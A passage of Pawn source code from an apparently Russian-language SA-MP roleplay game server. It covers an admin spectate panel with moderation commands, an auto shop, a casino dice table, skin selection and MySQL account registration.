	new textt[156];
	if(!strcmp(kvartinfo[i][vladelec],"None",true))
	{
		switch(booston)
		{
		case 0:format(textt, sizeof(textt),"{0076FC}Комната #%i\nПродается: %i вирт\nЧтобы войти, нажмите клавишу 'ENTER'",i,kvartinfo[i][kCena]);
		case 1:format(textt, sizeof(textt),"{0076FC}Комната #%i\nПродается: %i вирт\nЧтобы войти, нажмите клавишу 'ENTER'",i,kvartinfo[i][kCena]-kvartinfo[i][kCena]*40/100);
		}
	}
	else format(textt, sizeof(textt),"{FFBF00}Квартира #%i\nВладелец: %s\nЧтобы войти, нажмите клавишу 'ENTER'",i, kvartinfo[i][vladelec]);
	UpdateDynamic3DTextLabelText(kvartinfo[i][dtext],0x0076FCFF,textt);
}
publics: OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	if(Spectate[playerid] && PlayerInfo[playerid][pAdmin] > 1)
	{
		new httpquery[256];
		if(ReconPlayer[7] == playertextid) return SubTextDelete(playerid),ShowPlayerDialogEx(playerid, 202, DIALOG_STYLE_INPUT, "Ид игрока ", "Введите ид игрока", "Готово", "Отмена");
		else if(ReconPlayer[8] == playertextid)
		{
			DisableEnableReconButton(playerid, ReconSelect[playerid], 0);

			for(new i = 16; i < 35; i++)
			PlayerTextDrawHide(playerid, ReconPlayer[i]);

			for(new i = 16; i < 20; i++)
			PlayerTextDrawShow(playerid, ReconPlayer[i]);

			ReconBounds[playerid][0] = 16;
			ReconBounds[playerid][1] = 19;

			ReconSelectSub[playerid] = ReconBounds[playerid][0];
			DisableEnableReconButton(playerid, ReconSelectSub[playerid], 1);
		}
		else if(ReconPlayer[9] == playertextid)
		{
			DisableEnableReconButton(playerid, ReconSelect[playerid], 0);

			for(new i = 16; i < 35; i++)
			PlayerTextDrawHide(playerid, ReconPlayer[i]);

			for(new i = 20; i < 25; i++)
			PlayerTextDrawShow(playerid, ReconPlayer[i]);

			ReconBounds[playerid][0] = 20;
			ReconBounds[playerid][1] = 24;

			ReconSelectSub[playerid] = ReconBounds[playerid][0];
			DisableEnableReconButton(playerid, ReconSelectSub[playerid], 1);
		}
		else if(ReconPlayer[10] == playertextid)
		{
			DisableEnableReconButton(playerid, ReconSelect[playerid], 0);

			for(new i = 16; i < 35; i++)
			PlayerTextDrawHide(playerid, ReconPlayer[i]);

			PlayerTextDrawShow(playerid, ReconPlayer[25]);
			PlayerTextDrawShow(playerid, ReconPlayer[26]);

			ReconBounds[playerid][0] = 25;
			ReconBounds[playerid][1] = 26;

			ReconSelectSub[playerid] = ReconBounds[playerid][0];
			DisableEnableReconButton(playerid, ReconSelectSub[playerid], 1);

		}
		else if(ReconPlayer[12] == playertextid)
		{
			DisableEnableReconButton(playerid, ReconSelect[playerid], 0);

			for(new i = 16; i < 35; i++)
			PlayerTextDrawHide(playerid, ReconPlayer[i]);

			for(new i = 27; i < 30; i++)
			PlayerTextDrawShow(playerid, ReconPlayer[i]);

			ReconBounds[playerid][0] = 27;
			ReconBounds[playerid][1] = 29;

			ReconSelectSub[playerid] = ReconBounds[playerid][0];
			DisableEnableReconButton(playerid, ReconSelectSub[playerid], 1);
		}
		else if(ReconPlayer[13] == playertextid)
		{
			DisableEnableReconButton(playerid, ReconSelect[playerid], 0);

			for(new i = 16; i < 35; i++)
			PlayerTextDrawHide(playerid, ReconPlayer[i]);

			for(new i = 30; i < 34; i++)
			PlayerTextDrawShow(playerid, ReconPlayer[i]);

			ReconBounds[playerid][0] = 30;
			ReconBounds[playerid][1] = 33;

			ReconSelectSub[playerid] = ReconBounds[playerid][0];
			DisableEnableReconButton(playerid, ReconSelectSub[playerid], 1);
		}
		else if(ReconPlayer[11] == playertextid) return SubTextDelete(playerid),ShowPlayerDialogEx(playerid,101,DIALOG_STYLE_INPUT,"Причина","'             Введите причину             '","Готово","Отмена");
		else if(ReconPlayer[14] == playertextid) return SubTextDelete(playerid),StartSpectate(playerid,SpecAd[playerid]);
		else if(ReconPlayer[15] == playertextid) return SubTextDelete(playerid),CallLocalFunction("OnPlayerCommandText", "is", playerid, "/re OFF");
		else if(ReconPlayer[16] == playertextid)
		{
			new Float:boomx, Float:boomy, Float:boomz;
			GetPlayerPos(SpecAd[playerid],boomx, boomy, boomz);
			return CreateExplosion(boomx, boomy , boomz-8.9, 5, 0.5);
		}
		else if(ReconPlayer[17] == playertextid) return SetPlayerHealthAC(SpecAd[playerid], PlayerInfo[SpecAd[playerid]][pHP]-10.0);
		else if(ReconPlayer[18] == playertextid)
		{
			new Float: hp;
			GetVehicleHealth(GetPlayerVehicleID(SpecAd[playerid]), hp);
			SetVehicleHealth(GetPlayerVehicleID(SpecAd[playerid]), hp-10.0);
			return 1;
		}
		else if(ReconPlayer[19] == playertextid)
		{
			TimeNumberShotTarget[SpecAd[playerid]] = 0;
			TimeNumberShot[SpecAd[playerid]] = 0;
		}
		else if(ReconPlayer[20] == playertextid)
		{
			format(httpquery, sizeof(httpquery), "/mute %i 300",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
			//return SCM(playerid,COLOR_GREY,"Произошла ошибка. Бан чата не выдался");
		}
		else if(ReconPlayer[21] == playertextid)
		{
			format(httpquery, sizeof(httpquery), "/slap %i",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
		}
		else if(ReconPlayer[22] == playertextid)
		{
			format(httpquery, sizeof(httpquery), "/prison %i 3600",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
		}
		else if(ReconPlayer[23] == playertextid)
		{
			format(httpquery, sizeof(httpquery), "/freeze %i",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
		}
		else if(ReconPlayer[24] == playertextid)
		{
			format(httpquery, sizeof(httpquery), "/unfreeze %i",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
		}
		else if(ReconPlayer[25] == playertextid)
		{
			SubTextDelete(playerid);
			format(httpquery, sizeof(httpquery), "/skick %i",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
		}
		else if(ReconPlayer[26] == playertextid) return SubTextDelete(playerid),ShowPlayerDialogEx(playerid,115,DIALOG_STYLE_INPUT,"Причина","'             Введите причину             '","Готово","Отмена");
		else if(ReconPlayer[27] == playertextid) return SubTextDelete(playerid),ShowPlayerDialogEx(playerid,102,DIALOG_STYLE_INPUT,"Причина","'             Введите причину             '","Готово","Отмена");
		else if(ReconPlayer[28] == playertextid) return SubTextDelete(playerid),ShowPlayerDialogEx(playerid,116,DIALOG_STYLE_INPUT,"Причина","'             Введите причину             '","Готово","Отмена");
		else if(ReconPlayer[29] == playertextid) return SubTextDelete(playerid),ShowPlayerDialogEx(playerid,117,DIALOG_STYLE_INPUT,"Причина","'             Введите причину             '","Готово","Отмена");
		else if(ReconPlayer[30] == playertextid)
		{
			SubTextDelete(playerid);
			format(httpquery, sizeof(httpquery), "/getstats %i",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
		}
		else if(ReconPlayer[31] == playertextid)
		{
			SubTextDelete(playerid);
			format(httpquery, sizeof(httpquery), "/iwep %i",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
		}
		else if(ReconPlayer[32] == playertextid)
		{
			SubTextDelete(playerid);
			format(httpquery, sizeof(httpquery), "/getip %i",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
		}
		else if(ReconPlayer[33] == playertextid)
		{
			SubTextDelete(playerid);
			format(httpquery, sizeof(httpquery), "/getserial %i",SpecAd[playerid]);
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, httpquery);
		}
		else if(playertextid == ReconPlayer[34])
		{
			new stringer[1350];
			strcat(stringer,"{009933}Level:{FFFFFF} Лвл | Количество exp / Кол. exp необходимое для получения след. лвл\n");
			strcat(stringer,"{009933}Warns:{FFFFFF} Количество варнов\n{C0C0C0}\tЕсли число не отрицательное, то у игрока нет варнов, но они были раньше\n");
			strcat(stringer,"{009933}Armour:{FFFFFF} Броня\n{009933}Health:{FFFFFF} Здоровье\n{009933}CarHP:{FFFFFF} Здоровье машины\n{C0C0C0}\tТолько если игрок в транспорте,иначе значение будет 0\n");
			strcat(stringer,"{009933}Speed:{FFFFFF} Скорость транспорта / Макс. Скорость транспорта\n{C0C0C0}\tТолько если игрок в транспорте\n");
			strcat(stringer,"{009933}Ping:{FFFFFF} Пинг\n");
			strcat(stringer,"{009933}Ammo:{FFFFFF} Количество патронов на клиенте | Количество патронов на сервере\n{C0C0C0}\tТо что оображается игроку | Реальнок количество патронов\n");
			strcat(stringer,"{C0C0C0}\tПоказывает патроны оружия, которое у игрока в данный момент в руках\n");
			strcat(stringer,"{009933}Shot:{FFFFFF} Количество выстрелов / Количество попаданий | Процент попаданий\n");
			strcat(stringer,"{C0C0C0}\tСервер подсчитывает количество выстрелов сделанных игроком, пока он онлайн\n\tНа глаз можно определить, использует ли игрок AIM\n");
			strcat(stringer,"{009933}TimeShot:{FFFFFF} Количество выстрелов / Количество попаданий | Процент попаданий\n");
			strcat(stringer,"{C0C0C0}\tТоже самое, что предыдущая строка, но счетчик обнуляется каждые 10 минут\n\tВ меню Recon можно обнулить в любой момент - \"ResetShot\"\n");
			strcat(stringer,"{009933}AFKTime:{FFFFFF} Время игры и время проведенее в афк\n");
			strcat(stringer,"{009933}Engine:{FFFFFF} ON - Двигатель включен / OFF - Выключен");
			return ShowPlayerDialogEx(playerid,9999,0,"Help",stringer,"Закрыть","");
		}
	}
	return 1;
}
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	//AutoSalon
	if(Spectate[playerid] && PlayerInfo[playerid][pAdmin] > 1)
	{
		if(clickedid == Text:INVALID_TEXT_DRAW)
		DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
		return 1;
	}
	if(GetPVarInt(playerid, "SelectAvto") != -1)
	{
		if(clickedid == AutoShopText[0]) return BackCar(playerid);
		else if(clickedid == AutoShopText[1]) return NextCar(playerid);
		else if(clickedid == AutoShopText[2]) return NextColor(playerid,0);
		else if(clickedid == AutoShopText[3]) return NextColor(playerid,1);
		else if(clickedid == AutoShopText[4]) return BackColor(playerid,1);
		else if(clickedid == AutoShopText[5]) return BackColor(playerid,0);
		else if(clickedid == AutoShopText[6])
		{
		    if(GetPVarInt(playerid, "chosencar") == -1) SetPVarInt(playerid, "chosencar", 0);
		    new strs[128];
		    for(new i = 0; i < 5; i++)
		    {
		        new str[32];
		        format(str, sizeof(str), "%i %s\n", i, VehicleNames[CarInfo[playerid][carModel][i]-400]);
		        strcat(strs, str, sizeof(strs));
		    }
			return ShowPlayerDialogEx(playerid,14010,DIALOG_STYLE_LIST,"Замена авто",strs,"Купить","Отмена");
		}
		else if(clickedid == AutoShopText[7]) return ShowPlayerDialogEx(playerid,14011,0,"Предупреждение","Вы действительно хотите покинуть магазин?","Да","Нет");
	}
	else if(clickedid == Bone[3]) return ShowPlayerDialogEx(playerid,135,0,"Предупреждение","Если вы сделали ставку и игра уже началась, то деньги вам не вернутся!\nВы точно хотите покинуть стол?","Ок","Отмена");
	else if(clickedid == Bone[1])
	{
		if(GetPVarInt(playerid,"CasinoRank"))
		{
			new null = 0;
			for(new i; i < 5; i++) if(GetPVarInt(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Gamer][i],"BoneStol_")) null++;
			if(null > 0) return SCM(playerid,COLOR_GREY," В данный момент вы не можете изменить ставку!");
			return ShowPlayerDialogEx(playerid,136,1,"Установка ставки для игры:","Ставка должна быть не менее 1000 вирт\nи не более 300000000 вирт. Введите сумму ставки..","Далее","Отмена");
		}
		if(!BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Bet]) return SCM(playerid,COLOR_GREY," Ставка не установлена!");
		if(GetPVarInt(playerid,"BoneStol_")) return SCM(playerid,COLOR_GREY," Ты уже поставил ставку!");
		if(PlayerInfo[playerid][pCash] < BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Bet]) return SCM(playerid,COLOR_GREY," Недостаточно средств!");
		if(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] > 0) return SCM(playerid,COLOR_GREY," Игра уже запущена!");
		PlayerInfo[playerid][pCash]-=BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Bet];
		BoneInfo[GetPVarInt(playerid,"BoneStol")-1][bBank] += BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Bet];
		SetPVarInt(playerid,"BoneStol_",1);
		UpdateBone(GetPVarInt(playerid,"BoneStol")-1);
	}
	else if(clickedid == Bone[2])
	{
		if(GetPVarInt(playerid,"CasinoRank"))
		{
			new null = 0;
			for(new i; i < 5; i++) if(GetPVarInt(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][Gamer][i],"BoneStol_")) null++;
			if(null < 2) return SCM(playerid,COLOR_GREY," Нехватает игроков для старта!");
			if(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] > 0) return SCM(playerid,COLOR_GREY," Игра уже запущена!");
			return BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] = 30;
		}
		else
		{
			if(!GetPVarInt(playerid,"BoneStol_")) return SCM(playerid,COLOR_GREY," Вы не поставили ставку!");
			if(BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] <= 0) return SCM(playerid,COLOR_GREY," В данный момент нельзя кинуть кости");
			if(GetPVarInt(playerid,"BoneStol_") > 1) return SCM(playerid,COLOR_GREY," Вы уже кидали кубики в этом раунде!");
			new null = 0;
			SetPVarInt(playerid,"BoneStol_",random(11) + 2);
			UpdateBone(GetPVarInt(playerid,"BoneStol")-1);
			foreach(i)
			{
				if(GetPVarInt(i,"BoneStol")-1 == GetPVarInt(playerid,"BoneStol")-1 && GetPVarInt(i,"BoneStol_") == 1) null++;
			}
			if(!null) BoneInfo[GetPVarInt(playerid,"BoneStol")-1][GameStart] = 1;
		}
	}
	else if(clickedid == Select_Skin_TD[3]) //правая стрелка
	{
		if(ClothesRound[playerid] == 1)
		{
			 if(PlayerInfo[playerid][pSex] == 1)
			 {
				if(SelectCharPlace[playerid] == 1)
				{
                   format(string, 30,"Homeless");
                   PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				   SetPlayerSkin(playerid, 137);
				   SelectCharPlace[playerid] = 2;
				   ChosenSkin[playerid] = 137;
				}
				else if(SelectCharPlace[playerid] == 2)
				{
                   format(string, 30,"Homeless");
                   PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				   SetPlayerSkin(playerid, 212);
				   SelectCharPlace[playerid] = 3;
				   ChosenSkin[playerid] = 212;
				}
				else if(SelectCharPlace[playerid] == 3)
				{
                   format(string, 30,"Homeless");
                   PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				   SetPlayerSkin(playerid, 230);
				   SelectCharPlace[playerid] = 4;
				   ChosenSkin[playerid] = 230;
				}
				else if(SelectCharPlace[playerid] == 4)
				{
                    format(string, 30,"Homeless");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, 78);
					SelectCharPlace[playerid] = 5;
					ChosenSkin[playerid] = 78;
				}
				else if(SelectCharPlace[playerid] == 5)
				{
                    format(string, 30,"Hillbilly");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, 200);
					SelectCharPlace[playerid] = 6;
					ChosenSkin[playerid] = 200;
				}
				else if(SelectCharPlace[playerid] == 6)
				{
                    format(string, 30,"Homeless");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, 79);
					SelectCharPlace[playerid] = 1;
					ChosenSkin[playerid] = 79;
				}
			 }
			 else
			 {
				if(SelectCharPlace[playerid] == 1)
				{
                    format(string, 30,"Jogger");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, JoinPed[100][0]);
					SelectCharPlace[playerid] = 2;
					ChosenSkin[playerid] = JoinPed[100][0];
				}
				else if(SelectCharPlace[playerid] == 2)
				{
                    format(string, 30,"Normal Ped");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, JoinPed[101][0]);
					SelectCharPlace[playerid] = 1;
					ChosenSkin[playerid] = JoinPed[101][0];
				}
			 }
		}
		else
		{
             if(PlayerInfo[playerid][pSex] == 1)
	         {
		        if(ChangeSkin[playerid]	== sizeof(SkinMen)-1) ChangeSkin[playerid] = 0;
				else ChangeSkin[playerid]++;
				SetPlayerSkin(playerid,SkinMen[ChangeSkin[playerid]][0]);
				if(booston == 0)
				{
                     format(string, 127,"$%i",SkinMen[ChangeSkin[playerid]][1]);
			         PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
				}
				if(booston == 1)
				{
                     format(string, 127,"$%i",SkinMen[ChangeSkin[playerid]][1]-SkinMen[ChangeSkin[playerid]][1]*20/100);
                     PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
				}
	         }
	         else
	         {
				if(ChangeSkin[playerid] == sizeof(SkinMale)-1)ChangeSkin[playerid] = 0;
				else ChangeSkin[playerid]++;
				SetPlayerSkin(playerid,SkinMale[ChangeSkin[playerid]][0]);
				if(booston == 0)
				{
                     format(string, 127,"$%i",SkinMale[ChangeSkin[playerid]][1]);
                     PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
				}
				if(booston == 1)
				{
                     format(string, 127,"$%i",SkinMale[ChangeSkin[playerid]][1]-SkinMale[ChangeSkin[playerid]][1]*20/100);
                     PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
				}
	         }
		}
	}
	else if(clickedid == Select_Skin_TD[4]) //левая стрелка
	{
	    if(ClothesRound[playerid] == 1)
		{
	         if(PlayerInfo[playerid][pSex] == 1)
			 {
				if(SelectCharPlace[playerid] == 1)
				{
                    format(string, 30,"Hillbilly");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, 200);
					SelectCharPlace[playerid] = 6;
					ChosenSkin[playerid] = 200;
				}
				else if(SelectCharPlace[playerid] == 2)
				{
                    format(string, 30,"Homeless");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, 79);
					SelectCharPlace[playerid] = 1;
					ChosenSkin[playerid] = 79;
				}
				else if(SelectCharPlace[playerid] == 3)
				{
                    format(string, 30,"Homeless");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, 137);
					SelectCharPlace[playerid] = 2;
					ChosenSkin[playerid] = 137;
				}
				else if(SelectCharPlace[playerid] == 4)
				{
                    format(string, 30,"Homeless");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
                    SetPlayerSkin(playerid, 212);
					SelectCharPlace[playerid] = 3;
					ChosenSkin[playerid] = 212;
				}
				else if(SelectCharPlace[playerid] == 5)
				{
                    format(string, 30,"Homeless");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, 230);
					SelectCharPlace[playerid] = 4;
					ChosenSkin[playerid] = 230;
				}
				else if(SelectCharPlace[playerid] == 6)
				{
                    format(string, 30,"Homeless");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, 78);
					SelectCharPlace[playerid] = 5;
					ChosenSkin[playerid] = 78;
				}
			 }
			 else
			 {
				if(SelectCharPlace[playerid] == 1)
				{
                    format(string, 30,"Jogger");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, JoinPed[100][0]);
					SelectCharPlace[playerid] = 2;
					ChosenSkin[playerid] = JoinPed[100][0];
				}
				else if(SelectCharPlace[playerid] == 2)
				{
                    format(string, 30,"Normal Ped");
                    PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][0], string);
				    SetPlayerSkin(playerid, JoinPed[101][0]);
					SelectCharPlace[playerid] = 1;
					ChosenSkin[playerid] = JoinPed[101][0];
				}
			 }
		}
		else
		{
	        if(PlayerInfo[playerid][pSex] == 1)
			{
				if(ChangeSkin[playerid] == 0)ChangeSkin[playerid] = sizeof(SkinMen)-1;
				else ChangeSkin[playerid]--;
				SetPlayerSkin(playerid,SkinMen[ChangeSkin[playerid]][0]);
				if(booston == 0)
				{
                      format(string, 127,"$%i",SkinMen[ChangeSkin[playerid]][1]);
			          PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
				}
				if(booston == 1)
				{
                     format(string, 127,"$%i",SkinMen[ChangeSkin[playerid]][1]-SkinMen[ChangeSkin[playerid]][1]*20/100);
                     PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
				}
			}
			else
			{
				if(ChangeSkin[playerid] == 0)ChangeSkin[playerid] = sizeof(SkinMale)-1;
				else ChangeSkin[playerid]--;
				SetPlayerSkin(playerid,SkinMale[ChangeSkin[playerid]][0]);
				if(booston == 0)
				{
                     format(string, 127,"$%i",SkinMale[ChangeSkin[playerid]][1]);
                     PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
				}
				if(booston == 1)
				{
                     format(string, 127,"$%i",SkinMale[ChangeSkin[playerid]][1]-SkinMale[ChangeSkin[playerid]][1]*20/100);
                     PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
				}
			}
		}
	}
	else if(clickedid == Select_Skin_TD[6]) //cancel
	{
	    if(ClothesRound[playerid] == 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "Выберите скин для персонажа");
		}
		else
		{
		    switch(zips[playerid])
			{
				case false: SetPlayerVirtualWorld(playerid, 2);
				case true: SetPlayerVirtualWorld(playerid, 1);
			}
			ClothesRound[playerid] = 0;
			SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
			TogglePlayerControllable(playerid, 1);
			SetPlayerPos(playerid,221.7944,-8.4229,1002.2109);
			SetPlayerFacingAngle(playerid,273.5792);
			SetPlayerInterior(playerid,5);
			SetCameraBehindPlayer(playerid);
            CancelSelectTextDraw(playerid);
		    for(new i; i < 7; i++) TextDrawHideForPlayer(playerid, Select_Skin_TD[i]);
		    PlayerTextDrawHide(playerid, Select_Skin_PTD[playerid][0]);
		    PlayerTextDrawHide(playerid, Select_Skin_PTD[playerid][1]);
		}
	}
	else if(clickedid == Select_Skin_TD[5]) //accept
	{
	    if(ClothesRound[playerid] == 1)
		{
		    new year, month, day;
			getdate(year, month, day);
			format(PlayerInfo[playerid][pDataReg],32, "%02i/%02i/%02i",day,month,year);
			GetPlayerIp(playerid,YCMDstr,32);
			strmid(PlayerInfo[playerid][pIpReg],YCMDstr, 0, strlen(YCMDstr), 32);
			PlayerInfo[playerid][pPnumber] = 100000 + random(899999);
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "INSERT INTO `"TABLE_ACCOUNTS"` (`Name`, `pKey`, `pEmail`, `pSex`, `pDataReg`, `pIpReg`, `pDrug`,`pChars`, `pPnumber`, `pTut`, `pPHouseKey`, `pKvartiraKey`, `pPBizzKey`, `pPFarmKey`,`pPLimitBank`, `pAdmin`, `pChar`) VALUES ('%s', '%s', '%s', '%i', '%s', '%s', '%s', '%i, %i, %i, %i, %i, %i', '%i', '%i', '%i', '%i', '%i', '%i', '%i', '%i', '%i')"
			,PlayerInfo[playerid][pName],PlayerInfo[playerid][pKey],PlayerInfo[playerid][pEmail],PlayerInfo[playerid][pSex],PlayerInfo[playerid][pDataReg],PlayerInfo[playerid][pIpReg],PlayerInfo[playerid][pDrug],ChosenSkin[playerid], ChosenSkin[playerid], ChosenSkin[playerid],
			ChosenSkin[playerid], ChosenSkin[playerid], ChosenSkin[playerid], PlayerInfo[playerid][pPnumber], PlayerInfo[playerid][pTut], PlayerInfo[playerid][pPHouseKey], PlayerInfo[playerid][pKvartiraKey], PlayerInfo[playerid][pPBizzKey], PlayerInfo[playerid][pPFarmKey], PlayerInfo[playerid][pPLimitBank], PlayerInfo[playerid][pAdmin], PlayerInfo[playerid][pChar][0]);
			mysql_function_query(DATABASE,QUERY,true,"PlayerRegister","i",playerid);
		}
		else
		{
		    if(PlayerInfo[playerid][pSex] == 1)
			{
			    if(booston == 0)
			    {
			        if(PlayerInfo[playerid][pBank] < SkinMen[ChangeSkin[playerid]][1])
					{
						SCM(playerid,COLOR_GREY,"Недостаточно денег на банковском счету");
						return true;
				    }
    				PlayerInfo[playerid][pBank]-= SkinMen[ChangeSkin[playerid]][1],format(YCMDstr, sizeof(YCMDstr), "~r~-$%i",SkinMen[ChangeSkin[playerid]][1]);
				    GameTextForPlayer(playerid, YCMDstr, 2000, 1);
			    }
				if(booston == 1)
				{
					if(PlayerInfo[playerid][pBank] < SkinMen[ChangeSkin[playerid]][1]-SkinMen[ChangeSkin[playerid]][1]*20/100)
					{
						SCM(playerid,COLOR_GREY,"Недостаточно денег на банковском счету");
						return true;
					}
					PlayerInfo[playerid][pBank]-= SkinMen[ChangeSkin[playerid]][1],format(YCMDstr, sizeof(YCMDstr), "~r~-$%i",SkinMen[ChangeSkin[playerid]][1]-SkinMen[ChangeSkin[playerid]][1]*20/100);
					GameTextForPlayer(playerid, YCMDstr, 2000, 1);
				}
				if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 4)
				{
					PlayerPlaySound(playerid, 4201, 0.0, 0.0, 0);
					ShowPlayerDialogEx(playerid,13375,DIALOG_STYLE_MSGBOX,"Задание","Теперь ты можешь поехать в Мэрию и получить там паспорт\n{DDCD70}Задача: Войти в мэрию\n{17B757}Награда: 2 уровень,4000 вирт"
					,"Готово","");
					GameTextForPlayer(playerid, "~g~+1000$", 2000, 1);
					PlayerInfo[playerid][pCash] += 1000;
					PlayerInfo[playerid][pQuest] = 5;
					PlayerInfo[playerid][pQuestP] = 0;
					PlayerInfo[playerid][pQuestPF] = 0;
					SCM(playerid,0x30a0a7aa," Задание выполнено");
					mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pQuest = '%i', pQuestP = '%i', pQuestPF = '%i' WHERE name = '%e'",
				    PlayerInfo[playerid][pCash], PlayerInfo[playerid][pQuest], PlayerInfo[playerid][pQuestP], PlayerInfo[playerid][pQuestPF], PlayerInfo[playerid][pName]);
	                mysql_function_query(DATABASE,QUERY,false,"","");
				}
                switch(zips[playerid])
				{
					case false: SetPlayerVirtualWorld(playerid, 2);
					case true: SetPlayerVirtualWorld(playerid, 1);
				}
                ClothesRound[playerid] = 0;
               	PlayerInfo[playerid][pChar][0] = GetPlayerSkin(playerid);
			    TogglePlayerControllable(playerid, 1);
			    SetPlayerPos(playerid,221.7944,-8.4229,1002.2109);
			    SetPlayerFacingAngle(playerid,273.5792);
			    SetPlayerInterior(playerid,5);
 		        SetCameraBehindPlayer(playerid);
			    CancelSelectTextDraw(playerid);
			    for(new i; i < 7; i++) TextDrawHideForPlayer(playerid, Select_Skin_TD[i]);
			    PlayerTextDrawHide(playerid, Select_Skin_PTD[playerid][0]);
			    PlayerTextDrawHide(playerid, Select_Skin_PTD[playerid][1]);
    			mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pChar = '%i', pChars = '%i, %i, %i, %i, %i, %i' WHERE name = '%e'",
		    	PlayerInfo[playerid][pChar][0], GetPlayerSkin(playerid), GetPlayerSkin(playerid), GetPlayerSkin(playerid),
			    GetPlayerSkin(playerid), GetPlayerSkin(playerid), GetPlayerSkin(playerid), PlayerInfo[playerid][pName]);
	            mysql_function_query(DATABASE,QUERY,false,"","");
			}
			else
			{
				if(booston == 0)
				{
                    if(PlayerInfo[playerid][pBank] < SkinMale[ChangeSkin[playerid]][1])
					{
						SCM(playerid,COLOR_GREY,"Недостаточно денег на банковском счету");
						return true;
					}
					PlayerInfo[playerid][pBank]-= SkinMale[ChangeSkin[playerid]][1],format(YCMDstr, sizeof(YCMDstr), "~r~-$%i",SkinMale[ChangeSkin[playerid]][1]);
				    GameTextForPlayer(playerid, YCMDstr, 2000, 1);
				}
                if(booston == 1)
				{
					if(PlayerInfo[playerid][pBank] < SkinMale[ChangeSkin[playerid]][1]-SkinMale[ChangeSkin[playerid]][1]*20/100)
					{
						SCM(playerid,COLOR_GREY,"Недостаточно денег на банковском счету");
						return true;
					}
					PlayerInfo[playerid][pBank]-= SkinMale[ChangeSkin[playerid]][1],format(YCMDstr, sizeof(YCMDstr), "~r~-$%i",SkinMale[ChangeSkin[playerid]][1]-SkinMale[ChangeSkin[playerid]][1]*20/100);
					GameTextForPlayer(playerid, YCMDstr, 2000, 1);
				}
                if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 4)
				{
					PlayerPlaySound(playerid, 4201, 0.0, 0.0, 0);
					ShowPlayerDialogEx(playerid,13375,DIALOG_STYLE_MSGBOX,"Задание","Теперь ты можешь поехать в Мэрию и получить там паспорт\n{DDCD70}Задача: Войти в мэрию\n{17B757}Награда: 2 уровень,4000 вирт"
					,"Готово","");
					GameTextForPlayer(playerid, "~g~+1000$", 2000, 1);
					PlayerInfo[playerid][pCash] += 1000;
					PlayerInfo[playerid][pQuest] = 5;
					PlayerInfo[playerid][pQuestP] = 0;
					PlayerInfo[playerid][pQuestPF] = 0;
					SCM(playerid,0x30a0a7aa," Задание выполнено");
